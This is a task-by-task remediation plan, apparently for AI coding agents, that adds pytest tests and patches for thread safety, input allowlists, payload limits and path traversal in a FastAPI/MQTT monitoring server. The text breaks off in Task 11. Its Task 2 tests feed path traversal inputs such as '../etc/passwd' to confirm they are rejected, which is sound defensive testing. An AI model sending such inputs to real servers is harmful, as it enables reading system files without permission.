# Phase 1: Server Backend Remediation

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all critical, high, and medium findings in the server backend -- security, concurrency, data integrity, and code quality.

**Architecture:** The server is a FastAPI app with paho-mqtt integration, in-memory device state with JSON persistence, and WebSocket broadcast. Fixes target thread safety in DeviceRegistry, input validation across API routes, path traversal in static serving, and payload bounds in MQTT handling. All fixes are test-driven with pytest.

**Tech Stack:** Python 3.11+, FastAPI, paho-mqtt, pytest, pytest-asyncio, pytest-mock, threading

---

## File Map

### New Files
- `mqtt-network-monitor-addon/server/auth.py` -- Ingress auth middleware
- `mqtt-network-monitor-addon/tests/conftest.py` -- Shared fixtures
- `mqtt-network-monitor-addon/tests/test_storage.py` -- Storage unit tests
- `mqtt-network-monitor-addon/tests/test_device_registry.py` -- Registry unit tests
- `mqtt-network-monitor-addon/tests/test_settings_manager.py` -- Settings unit tests
- `mqtt-network-monitor-addon/tests/test_settings_resolver.py` -- Resolver unit tests
- `mqtt-network-monitor-addon/tests/test_auth.py` -- Auth middleware tests
- `mqtt-network-monitor-addon/tests/test_main.py` -- Main module unit tests
- `mqtt-network-monitor-addon/tests/test_routes.py` -- API route tests
- `mqtt-network-monitor-addon/tests/test_mqtt_handler.py` -- MQTT handler tests
- `mqtt-network-monitor-addon/pytest.ini` -- pytest configuration

### Modified Files
- `mqtt-network-monitor-addon/server/storage/store.py` -- Replace asserts with raises
- `mqtt-network-monitor-addon/server/device_registry.py` -- Lock all mutating methods, deep copy returns, immediate config persistence
- `mqtt-network-monitor-addon/server/settings_manager.py` -- Key allowlist in update_settings, deep copy returns
- `mqtt-network-monitor-addon/server/mqtt_handler.py` -- Payload size limit
- `mqtt-network-monitor-addon/server/api/websocket.py` -- asyncio.Lock for thread safety
- `mqtt-network-monitor-addon/server/main.py` -- Path traversal fix, narrow AssertionError, fix _device_hash, fix _check_crit_alerts, offload MQTT callbacks
- `mqtt-network-monitor-addon/server/api/routes_settings.py` -- Fix broken import endpoint
- `mqtt-network-monitor-addon/server/api/routes_devices.py` -- Command validation
- `mqtt-network-monitor-addon/server/command_sender.py` -- Periodic eviction, remove unused import

---

### Task 1: Test Infrastructure Setup

**Files:**
- Create: `mqtt-network-monitor-addon/pytest.ini`
- Create: `mqtt-network-monitor-addon/tests/conftest.py`

- [ ] **Step 1: Create pytest.ini**

```ini
[pytest]
testpaths = tests
asyncio_mode = auto
```

- [ ] **Step 2: Create conftest.py with shared fixtures**

```python
import pytest
import tempfile
import shutil
from pathlib import Path
from server.storage.store import Storage
from server.device_registry import DeviceRegistry
from server.settings_manager import SettingsManager


@pytest.fixture
def tmp_data_dir(tmp_path):
    """Provides a temporary data directory for storage."""
    return tmp_path


@pytest.fixture
def storage(tmp_data_dir):
    """Provides a Storage instance backed by a temp directory."""
    return Storage(tmp_data_dir)


@pytest.fixture
def registry(storage):
    """Provides a DeviceRegistry with clean storage."""
    return DeviceRegistry(storage)


@pytest.fixture
def settings_manager(storage):
    """Provides a SettingsManager with clean storage."""
    return SettingsManager(storage)
```

- [ ] **Step 3: Verify pytest discovers the config**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest --collect-only 2>&1 | head -20`
Expected: "no tests ran" or "collected 0 items" (no errors)

- [ ] **Step 4: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/pytest.ini mqtt-network-monitor-addon/tests/conftest.py
git commit -m "test: add pytest infrastructure for server tests"
```

---

### Task 2: Fix Storage -- Replace Asserts with Raises

**Files:**
- Modify: `mqtt-network-monitor-addon/server/storage/store.py:17,28`
- Create: `mqtt-network-monitor-addon/tests/test_storage.py`

- [ ] **Step 1: Write failing tests for storage validation**

```python
import pytest
from server.storage.store import Storage


class TestStorageValidation:
    def test_load_rejects_path_traversal_slash(self, storage):
        with pytest.raises(ValueError, match="Invalid filename"):
            storage.load("../etc/passwd")

    def test_load_rejects_path_traversal_dotdot(self, storage):
        with pytest.raises(ValueError, match="Invalid filename"):
            storage.load("foo/../bar.json")

    def test_save_rejects_path_traversal_slash(self, storage):
        with pytest.raises(ValueError, match="Invalid filename"):
            storage.save("../evil.json", {"x": 1})

    def test_save_rejects_path_traversal_dotdot(self, storage):
        with pytest.raises(ValueError, match="Invalid filename"):
            storage.save("foo/../evil.json", {"x": 1})

    def test_load_valid_filename_works(self, storage):
        storage.save("test.json", {"key": "value"})
        result = storage.load("test.json")
        assert result == {"key": "value"}

    def test_load_missing_file_returns_empty_dict(self, storage):
        result = storage.load("nonexistent.json")
        assert result == {}

    def test_save_atomic_write(self, storage, tmp_data_dir):
        storage.save("atomic.json", {"data": 123})
        path = tmp_data_dir / "atomic.json"
        assert path.exists()
        tmp_files = list(tmp_data_dir.glob("*.tmp"))
        assert len(tmp_files) == 0, "Temp file should be cleaned up after atomic write"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_storage.py -v`
Expected: FAIL -- `assert` raises `AssertionError`, not `ValueError`

- [ ] **Step 3: Replace assert with if/raise in store.py**

In `mqtt-network-monitor-addon/server/storage/store.py`, replace line 17:
```python
        assert '/' not in filename and '..' not in filename, f"Invalid filename: {filename}"
```
with:
```python
        if '/' in filename or '..' in filename:
            raise ValueError(f"Invalid filename: {filename}")
```

Replace line 28 (same pattern):
```python
        assert '/' not in filename and '..' not in filename, f"Invalid filename: {filename}"
```
with:
```python
        if '/' in filename or '..' in filename:
            raise ValueError(f"Invalid filename: {filename}")
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_storage.py -v`
Expected: All 7 tests PASS

- [ ] **Step 5: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/storage/store.py mqtt-network-monitor-addon/tests/test_storage.py
git commit -m "fix: replace assert with ValueError in Storage for production safety"
```

---

### Task 3: Fix DeviceRegistry -- Thread Safety (Locking)

**Files:**
- Modify: `mqtt-network-monitor-addon/server/device_registry.py:268-375`
- Create: `mqtt-network-monitor-addon/tests/test_device_registry.py`

- [ ] **Step 1: Write tests for thread-safe group/device operations**

```python
import pytest
import threading
import time
from server.device_registry import DeviceRegistry


class TestDeviceRegistryCRUD:
    def test_create_group(self, registry):
        group = registry.create_group("test_group", "Test Group", ["dev1"])
        assert group["name"] == "Test Group"
        assert "dev1" in group["device_ids"]

    def test_delete_group_clears_device_refs(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.create_group("grp1", "Group 1", ["dev1"])
        dev = registry.get_device("dev1")
        assert dev["group_policy"] == "grp1"
        registry.delete_group("grp1")
        dev = registry.get_device("dev1")
        assert dev["group_policy"] is None

    def test_delete_device_removes_from_groups(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.create_group("grp1", "Group 1", ["dev1"])
        registry.delete_device("dev1")
        groups = registry.get_groups()
        assert "dev1" not in groups["grp1"]["device_ids"]

    def test_delete_attribute(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}, "mem": {"value": 70}})
        registry.delete_attribute("dev1", "cpu")
        dev = registry.get_device("dev1")
        assert "cpu" not in dev["attributes"]
        assert "mem" in dev["attributes"]

    def test_add_server_tags(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.add_server_tags("dev1", ["tag1", "tag2"])
        dev = registry.get_device("dev1")
        assert "tag1" in dev["server_tags"]

    def test_remove_server_tag(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.add_server_tags("dev1", ["tag1", "tag2"])
        registry.remove_server_tag("dev1", "tag1")
        dev = registry.get_device("dev1")
        assert "tag1" not in dev["server_tags"]

    def test_set_server_tags(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.set_server_tags("dev1", ["tagA", "tagB"])
        dev = registry.get_device("dev1")
        assert set(dev["server_tags"]) == {"tagA", "tagB"}


class TestDeviceRegistryThreadSafety:
    def test_concurrent_group_creation(self, registry):
        """Multiple threads creating groups simultaneously should not corrupt state."""
        errors = []

        def create_group(i):
            try:
                registry.update_device(f"dev{i}", {"cpu": {"value": i}})
                registry.create_group(f"grp{i}", f"Group {i}", [f"dev{i}"])
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=create_group, args=(i,)) for i in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0, f"Errors during concurrent creation: {errors}"
        groups = registry.get_groups()
        assert len(groups) == 20

    def test_concurrent_device_updates_and_deletes(self, registry):
        """Concurrent updates and deletes should not raise exceptions."""
        for i in range(10):
            registry.update_device(f"dev{i}", {"cpu": {"value": i}})

        errors = []

        def updater():
            for _ in range(50):
                try:
                    registry.update_device("dev0", {"cpu": {"value": 99}})
                except Exception as e:
                    errors.append(e)

        def deleter():
            time.sleep(0.01)
            for i in range(1, 10):
                try:
                    registry.delete_device(f"dev{i}")
                except Exception as e:
                    errors.append(e)

        t1 = threading.Thread(target=updater)
        t2 = threading.Thread(target=deleter)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

        assert len(errors) == 0, f"Errors during concurrent ops: {errors}"
```

- [ ] **Step 2: Run tests to see thread safety failures**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_device_registry.py -v`
Expected: CRUD tests pass, thread safety tests may pass or fail non-deterministically (race conditions are probabilistic)

- [ ] **Step 3: Add lock to all unprotected mutating methods**

In `mqtt-network-monitor-addon/server/device_registry.py`, wrap each of these methods with `with self._lock:`:

**create_group (line 268)** -- add lock:
```python
    def create_group(self, group_id: str, name: str, device_ids: list[str] | None = None) -> dict:
        with self._lock:
            # ... existing body indented one level ...
```

**delete_group (line 340)** -- add lock:
```python
    def delete_group(self, group_id: str) -> bool:
        with self._lock:
            # ... existing body indented one level ...
```

**delete_device (line 365)** -- add lock:
```python
    def delete_device(self, device_id: str) -> bool:
        with self._lock:
            # ... existing body indented one level ...
```

**delete_attribute (line 354)** -- add lock:
```python
    def delete_attribute(self, device_id: str, attr_name: str) -> bool:
        with self._lock:
            # ... existing body indented one level ...
```

**add_server_tags (line 292)** -- add lock:
```python
    def add_server_tags(self, device_id: str, tags: list[str]):
        with self._lock:
            # ... existing body indented one level ...
```

**remove_server_tag (line 300)** -- add lock:
```python
    def remove_server_tag(self, device_id: str, tag: str):
        with self._lock:
            # ... existing body indented one level ...
```

**set_server_tags (line 307)** -- add lock:
```python
    def set_server_tags(self, device_id: str, tags: list[str]):
        with self._lock:
            # ... existing body indented one level ...
```

**add_command_response (line 380)** -- add lock:
```python
    def add_command_response(self, device_id: str, response: dict):
        with self._lock:
            # ... existing body indented one level ...
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_device_registry.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/device_registry.py mqtt-network-monitor-addon/tests/test_device_registry.py
git commit -m "fix: add lock to all mutating DeviceRegistry methods for thread safety"
```

---

### Task 4: Fix DeviceRegistry -- Safe Serialization and Deep Copy Returns

**Files:**
- Modify: `mqtt-network-monitor-addon/server/device_registry.py:54-60,259-266`
- Modify: `mqtt-network-monitor-addon/tests/test_device_registry.py`

- [ ] **Step 1: Write tests for mutation isolation and safe serialization**

Add to `tests/test_device_registry.py`:

```python
import copy


class TestDeviceRegistryIsolation:
    def test_get_all_devices_returns_deep_copy(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50, "unit": "%"}})
        devices = registry.get_all_devices()
        # Mutate the returned dict
        devices["dev1"]["attributes"]["cpu"]["value"] = 999
        # Original should be unchanged
        original = registry.get_device("dev1")
        assert original["attributes"]["cpu"]["value"] == 50

    def test_get_device_returns_deep_copy(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50, "unit": "%"}})
        device = registry.get_device("dev1")
        device["attributes"]["cpu"]["value"] = 999
        original = registry.get_device("dev1")
        assert original["attributes"]["cpu"]["value"] == 50

    def test_get_groups_returns_deep_copy(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.create_group("grp1", "Group 1", ["dev1"])
        groups = registry.get_groups()
        groups["grp1"]["device_ids"].append("fake_device")
        original = registry.get_groups()
        assert "fake_device" not in original["grp1"]["device_ids"]
```

- [ ] **Step 2: Run tests to see mutation leakage**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_device_registry.py::TestDeviceRegistryIsolation -v`
Expected: FAIL -- shallow copies allow mutation of nested dicts

- [ ] **Step 3: Add deep copy to getters and safe flush**

Add `import copy` at top of `device_registry.py` (after existing imports).

Replace `get_all_devices` (line 262-263):
```python
    def get_all_devices(self) -> dict[str, dict]:
        with self._lock:
            return copy.deepcopy(self._devices)
```

Replace `get_device` (line 259-260):
```python
    def get_device(self, device_id: str) -> dict | None:
        with self._lock:
            dev = self._devices.get(device_id)
            return copy.deepcopy(dev) if dev else None
```

Replace `get_groups` (line 265-266):
```python
    def get_groups(self) -> dict[str, dict]:
        with self._lock:
            return copy.deepcopy(self._groups)
```

Replace `_flush_devices` (lines 54-60) to snapshot before serializing:
```python
    def _flush_devices(self):
        with self._devices_save_lock:
            self._devices_save_timer = None
            if self._devices_dirty:
                with self._lock:
                    snapshot = copy.deepcopy(self._devices)
                self._storage.save(DEVICES_FILE, snapshot)
                self._devices_dirty = False
```

Replace `_flush_groups` (lines 75-81) similarly:
```python
    def _flush_groups(self):
        with self._groups_save_lock:
            self._groups_save_timer = None
            if self._groups_dirty:
                with self._lock:
                    snapshot = copy.deepcopy(self._groups)
                self._storage.save(GROUPS_FILE, snapshot)
                self._groups_dirty = False
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_device_registry.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/device_registry.py mqtt-network-monitor-addon/tests/test_device_registry.py
git commit -m "fix: deep copy returns and safe serialization in DeviceRegistry"
```

---

### Task 5: Fix DeviceRegistry -- Immediate Config Persistence and allowed_keys

**Files:**
- Modify: `mqtt-network-monitor-addon/server/device_registry.py:449-465`
- Modify: `mqtt-network-monitor-addon/tests/test_device_registry.py`

- [ ] **Step 1: Write tests for allowed_keys and immediate persistence**

Add to `tests/test_device_registry.py`:

```python
class TestDeviceSettings:
    def test_set_device_settings_allowed_commands(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.set_device_settings("dev1", {"allowed_commands": ["reboot", "status"]})
        dev = registry.get_device("dev1")
        assert dev["allowed_commands"] == ["reboot", "status"]

    def test_set_device_settings_attributes(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.set_device_settings("dev1", {"attributes": {"cpu": {"value": 99}}})
        dev = registry.get_device("dev1")
        assert dev["attributes"] == {"cpu": {"value": 99}}

    def test_set_device_settings_rejects_unknown_keys(self, registry):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.set_device_settings("dev1", {"evil_key": "bad_value"})
        dev = registry.get_device("dev1")
        assert "evil_key" not in dev

    def test_group_create_persists_immediately(self, registry, storage):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.create_group("grp1", "Group 1", ["dev1"])
        # Force-read from disk (bypass in-memory state)
        on_disk = storage.load("groups.json")
        assert "grp1" in on_disk

    def test_group_delete_persists_immediately(self, registry, storage):
        registry.update_device("dev1", {"cpu": {"value": 50}})
        registry.create_group("grp1", "Group 1", ["dev1"])
        registry.flush()  # ensure first save
        registry.delete_group("grp1")
        on_disk = storage.load("groups.json")
        assert "grp1" not in on_disk
```

- [ ] **Step 2: Run tests to see failures**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_device_registry.py::TestDeviceSettings -v`
Expected: FAIL on allowed_commands (key filtered out), attributes (key filtered out), and immediate persistence (5-sec debounce means not yet on disk)

- [ ] **Step 3: Add missing keys to allowed_keys**

In `device_registry.py`, find the `allowed_keys` set in `set_device_settings` (around line 455) and add `"allowed_commands"` and `"attributes"`:

```python
        allowed_keys = {"group_policy", "ha_exposure_overrides", "threshold_overrides",
                        "crit_threshold_overrides", "server_commands", "remote_config",
                        "hidden_attributes", "hidden_commands", "card_attributes",
                        "server_sensors", "config_interval", "attribute_transforms",
                        "allowed_commands", "attributes"}
```

- [ ] **Step 4: Add immediate persistence for group mutations**

In `create_group`, after the `_save_groups()` call, add an immediate flush:

Replace the `_save_groups()` call at the end of `create_group` with:
```python
            self._flush_groups_immediate()
```

In `delete_group`, same replacement at the end.

In `update_group`, same replacement at the end.

Add the new method to DeviceRegistry (after `_save_groups`):
```python
    def _flush_groups_immediate(self):
        """Persist groups to disk immediately (bypasses debounce)."""
        with self._lock:
            snapshot = copy.deepcopy(self._groups)
        self._storage.save(GROUPS_FILE, snapshot)
        self._groups_dirty = False
        if self._groups_save_timer:
            self._groups_save_timer.cancel()
            self._groups_save_timer = None
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_device_registry.py -v`
Expected: All tests PASS

- [ ] **Step 6: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/device_registry.py mqtt-network-monitor-addon/tests/test_device_registry.py
git commit -m "fix: add allowed_commands/attributes to allowed_keys, immediate group persistence"
```

---

### Task 6: Fix Settings Manager -- Key Allowlist and Deep Copy

**Files:**
- Modify: `mqtt-network-monitor-addon/server/settings_manager.py:61-70`
- Create: `mqtt-network-monitor-addon/tests/test_settings_manager.py`

- [ ] **Step 1: Write tests for settings validation**

```python
import pytest
from server.settings_manager import SettingsManager


class TestSettingsManager:
    def test_update_settings_allowed_keys(self, settings_manager):
        result = settings_manager.update_settings({
            "default_thresholds": {"cpu_usage": 90}
        })
        assert result["default_thresholds"]["cpu_usage"] == 90

    def test_update_settings_rejects_unknown_keys(self, settings_manager):
        result = settings_manager.update_settings({
            "evil_injection": "malicious_value"
        })
        assert "evil_injection" not in result

    def test_get_settings_returns_deep_copy(self, settings_manager):
        s1 = settings_manager.get_settings()
        s1["default_thresholds"]["injected"] = 999
        s2 = settings_manager.get_settings()
        assert "injected" not in s2["default_thresholds"]

    def test_update_settings_deep_merge(self, settings_manager):
        settings_manager.update_settings({"default_thresholds": {"cpu_usage": 80}})
        settings_manager.update_settings({"default_thresholds": {"mem_usage": 90}})
        result = settings_manager.get_settings()
        assert result["default_thresholds"]["cpu_usage"] == 80
        assert result["default_thresholds"]["mem_usage"] == 90

    def test_persistence_round_trip(self, storage):
        sm1 = SettingsManager(storage)
        sm1.update_settings({"default_thresholds": {"cpu_usage": 75}})
        sm2 = SettingsManager(storage)
        assert sm2.get_settings()["default_thresholds"]["cpu_usage"] == 75
```

- [ ] **Step 2: Run tests to see failures**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_settings_manager.py -v`
Expected: FAIL on `rejects_unknown_keys` (no allowlist) and `returns_deep_copy` (shallow copy)

- [ ] **Step 3: Add key allowlist and deep copy to SettingsManager**

In `mqtt-network-monitor-addon/server/settings_manager.py`, add at module level (after DEFAULT_SETTINGS):

```python
ALLOWED_SETTINGS_KEYS = {
    "default_thresholds", "crit_thresholds", "ha_exposure",
    "cleanup_days", "alert_cooldown_minutes", "hidden_attributes",
    "hidden_commands", "card_attributes", "attribute_transforms",
}
```

Replace `update_settings` method (lines 65-70):
```python
    def update_settings(self, data: dict[str, Any]) -> dict[str, Any]:
        """Apply *data* on top of current settings. Returns updated settings."""
        filtered = {k: v for k, v in data.items() if k in ALLOWED_SETTINGS_KEYS}
        self._deep_update(self._settings, filtered)
        self._save()
        logger.debug(f"Global settings updated: {list(filtered.keys())}")
        return self.get_settings()
```

Replace `get_settings` method (lines 61-63):
```python
    def get_settings(self) -> dict[str, Any]:
        return copy.deepcopy(self._settings)
```

Note: `copy` is already imported at top of file.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_settings_manager.py -v`
Expected: All 5 tests PASS

- [ ] **Step 5: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/settings_manager.py mqtt-network-monitor-addon/tests/test_settings_manager.py
git commit -m "fix: add key allowlist and deep copy returns to SettingsManager"
```

---

### Task 7: Fix Settings Resolver -- Add Tests

**Files:**
- Create: `mqtt-network-monitor-addon/tests/test_settings_resolver.py`

- [ ] **Step 1: Write tests for cascade resolution**

```python
from server.settings_resolver import resolve_settings


class TestSettingsResolver:
    def test_global_only(self):
        global_settings = {"default_thresholds": {"cpu_usage": 90}}
        device = {"group_policy": None, "threshold_overrides": {}}
        groups = {}
        result = resolve_settings(device, groups, global_settings)
        assert result["effective_thresholds"]["cpu_usage"] == 90

    def test_group_overrides_global(self):
        global_settings = {"default_thresholds": {"cpu_usage": 90}}
        groups = {"grp1": {"thresholds": {"cpu_usage": 80}}}
        device = {"group_policy": "grp1", "threshold_overrides": {}}
        result = resolve_settings(device, groups, global_settings)
        assert result["effective_thresholds"]["cpu_usage"] == 80

    def test_device_overrides_group(self):
        global_settings = {"default_thresholds": {"cpu_usage": 90}}
        groups = {"grp1": {"thresholds": {"cpu_usage": 80}}}
        device = {"group_policy": "grp1", "threshold_overrides": {"cpu_usage": 70}}
        result = resolve_settings(device, groups, global_settings)
        assert result["effective_thresholds"]["cpu_usage"] == 70

    def test_missing_group_falls_through(self):
        global_settings = {"default_thresholds": {"cpu_usage": 90}}
        groups = {}
        device = {"group_policy": "nonexistent", "threshold_overrides": {}}
        result = resolve_settings(device, groups, global_settings)
        assert result["effective_thresholds"]["cpu_usage"] == 90

    def test_empty_overrides_use_lower_level(self):
        global_settings = {"default_thresholds": {"cpu_usage": 90, "mem_usage": 85}}
        groups = {"grp1": {"thresholds": {"cpu_usage": 80}}}
        device = {"group_policy": "grp1", "threshold_overrides": {}}
        result = resolve_settings(device, groups, global_settings)
        assert result["effective_thresholds"]["cpu_usage"] == 80
        assert result["effective_thresholds"]["mem_usage"] == 85
```

- [ ] **Step 2: Run tests**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_settings_resolver.py -v`
Expected: Tests should PASS (verifying existing logic is correct). If any fail, investigate and adjust test expectations to match the actual resolve_settings signature (read the function first).

- [ ] **Step 3: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/tests/test_settings_resolver.py
git commit -m "test: add unit tests for settings resolver cascade logic"
```

---

### Task 8: Fix MQTT Handler -- Payload Size Limit

**Files:**
- Modify: `mqtt-network-monitor-addon/server/mqtt_handler.py:72-131`
- Create: `mqtt-network-monitor-addon/tests/test_mqtt_handler.py`

- [ ] **Step 1: Write tests for payload size limiting**

```python
import json
import pytest
from unittest.mock import MagicMock, patch
from server.mqtt_handler import MQTTHandler


@pytest.fixture
def mqtt_handler(registry):
    """Create MQTTHandler without connecting to a real broker."""
    handler = MQTTHandler(registry, broker="localhost", port=1883)
    return handler


class TestMQTTPayloadSize:
    def test_rejects_oversized_payload(self, mqtt_handler):
        """Messages over MAX_PAYLOAD_SIZE should be dropped."""
        msg = MagicMock()
        msg.topic = "network_monitor/dev1/system_resources"
        msg.payload = b"x" * (64 * 1024 + 1)  # 64KB + 1
        # Should not raise, just log and return
        mqtt_handler._on_message(None, None, msg)
        # Device should NOT be updated
        dev = mqtt_handler._registry.get_device("dev1")
        assert dev is None

    def test_accepts_normal_payload(self, mqtt_handler):
        """Normal-sized messages should be processed."""
        data = {
            "device_id": "dev1",
            "timestamp": "2026-01-01T00:00:00Z",
            "attributes": {"cpu": {"value": 50, "unit": "%"}},
        }
        msg = MagicMock()
        msg.topic = "network_monitor/dev1/system_resources"
        msg.payload = json.dumps(data).encode()
        mqtt_handler._on_message(None, None, msg)
        dev = mqtt_handler._registry.get_device("dev1")
        assert dev is not None
```

- [ ] **Step 2: Run tests to see size check failure**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_mqtt_handler.py -v`
Expected: FAIL -- oversized payload is not rejected

- [ ] **Step 3: Add payload size check**

In `mqtt-network-monitor-addon/server/mqtt_handler.py`, add constant after `TOPIC_PREFIX` (line 11):

```python
MAX_PAYLOAD_SIZE = 64 * 1024  # 64KB
```

In `_on_message` method, add size check as the first thing after the method signature (before any processing, around line 73):

```python
    def _on_message(self, client, userdata, msg):
        if len(msg.payload) > MAX_PAYLOAD_SIZE:
            logger.warning(f"Dropping oversized MQTT payload ({len(msg.payload)} bytes) from {msg.topic}")
            return
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_mqtt_handler.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/mqtt_handler.py mqtt-network-monitor-addon/tests/test_mqtt_handler.py
git commit -m "fix: add 64KB payload size limit to MQTT handler"
```

---

### Task 9: Fix WebSocket Thread Safety

**Files:**
- Modify: `mqtt-network-monitor-addon/server/api/websocket.py`

- [ ] **Step 1: Add asyncio.Lock to ConnectionManager**

Replace the full content of `websocket.py` with:

```python
import asyncio
import json
import logging
from fastapi import WebSocket, WebSocketDisconnect
from typing import Any

logger = logging.getLogger(__name__)


class ConnectionManager:
    def __init__(self):
        self._connections: list[WebSocket] = []
        self._lock = asyncio.Lock()

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        async with self._lock:
            self._connections.append(websocket)
        logger.info(f"WebSocket connected ({self.connection_count} total)")

    async def disconnect(self, websocket: WebSocket):
        async with self._lock:
            if websocket in self._connections:
                self._connections.remove(websocket)
        logger.info(f"WebSocket disconnected ({self.connection_count} total)")

    async def broadcast(self, data: dict[str, Any]):
        message = json.dumps(data)
        async with self._lock:
            stale = []
            for ws in self._connections:
                try:
                    await ws.send_text(message)
                except Exception:
                    stale.append(ws)
            for ws in stale:
                self._connections.remove(ws)

    @property
    def connection_count(self) -> int:
        return len(self._connections)


ws_manager = ConnectionManager()
```

- [ ] **Step 2: Verify the server still starts**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -c "from server.api.websocket import ws_manager; print('OK')"` 
Expected: `OK`

- [ ] **Step 3: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/api/websocket.py
git commit -m "fix: add asyncio.Lock to WebSocket ConnectionManager for thread safety"
```

---

### Task 10: Fix main.py -- Path Traversal

**Files:**
- Modify: `mqtt-network-monitor-addon/server/main.py:269-274`
- Create: `mqtt-network-monitor-addon/tests/test_main.py`

- [ ] **Step 1: Write test for path traversal prevention**

```python
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient


class TestStaticFileServing:
    @pytest.fixture
    def client(self):
        """Create a test client with the app."""
        # We need to import after patching to avoid MQTT connection
        import server.main
        # Use the inner_app from create_app if available, or just test the route logic
        from server.api.routes import app
        return TestClient(app)

    def test_path_traversal_blocked(self, tmp_path):
        """Requests with .. should not serve files outside frontend dir."""
        frontend_dist = tmp_path / "dist"
        frontend_dist.mkdir()
        (frontend_dist / "index.html").write_text("<html>ok</html>")

        # Create a file outside the dist dir
        secret = tmp_path / "secret.txt"
        secret.write_text("secret data")

        # Simulate the path resolution check
        full_path = "../secret.txt"
        file_path = (frontend_dist / full_path).resolve()
        assert not file_path.is_relative_to(frontend_dist.resolve()), \
            "Path traversal should be detected"
```

- [ ] **Step 2: Run tests**

Run: `cd /home/user/Projects/MQTTNetworkMonitor/mqtt-network-monitor-addon && python -m pytest tests/test_main.py::TestStaticFileServing -v`
Expected: PASS (this tests the check we're about to add, confirming the logic is correct)

- [ ] **Step 3: Fix the static file handler**

In `mqtt-network-monitor-addon/server/main.py`, replace the `serve_frontend` function (lines 269-274):

```python
    @app.get("/{full_path:path}")
    async def serve_frontend(full_path: str):
        file_path = (frontend_dist / full_path).resolve()
        if full_path and file_path.is_relative_to(frontend_dist.resolve()) and file_path.is_file():
            return FileResponse(file_path)
        return FileResponse(frontend_dist / "index.html")
```

- [ ] **Step 4: Commit**

```bash
cd /home/user/Projects/MQTTNetworkMonitor
git add mqtt-network-monitor-addon/server/main.py mqtt-network-monitor-addon/tests/test_main.py
git commit -m "fix: prevent path traversal in static file serving"
```

---

### Task 11: Fix main.py -- Narrow AssertionError Catch, Fix _device_hash, Fix _check_crit_alerts

**Files:**
- Modify: `mqtt-network-monitor-addon/server/main.py:36-41,164-207,288-295`
- Modify: `mqtt-network-monitor-addon/tests/test_main.py`

- [ ] **Step 1: Write tests for _device_hash and _check_crit_alerts logic**

Add to `tests/test_main.py`:

```python
class TestDeviceHash:
    def test_hash_includes_hidden_attributes(self):
        """Changes to hidden_attributes should produce different hashes."""
        from server.main import _device_hash

        d1 = {"status": "online", "attributes": {"cpu": {"value": 50}},
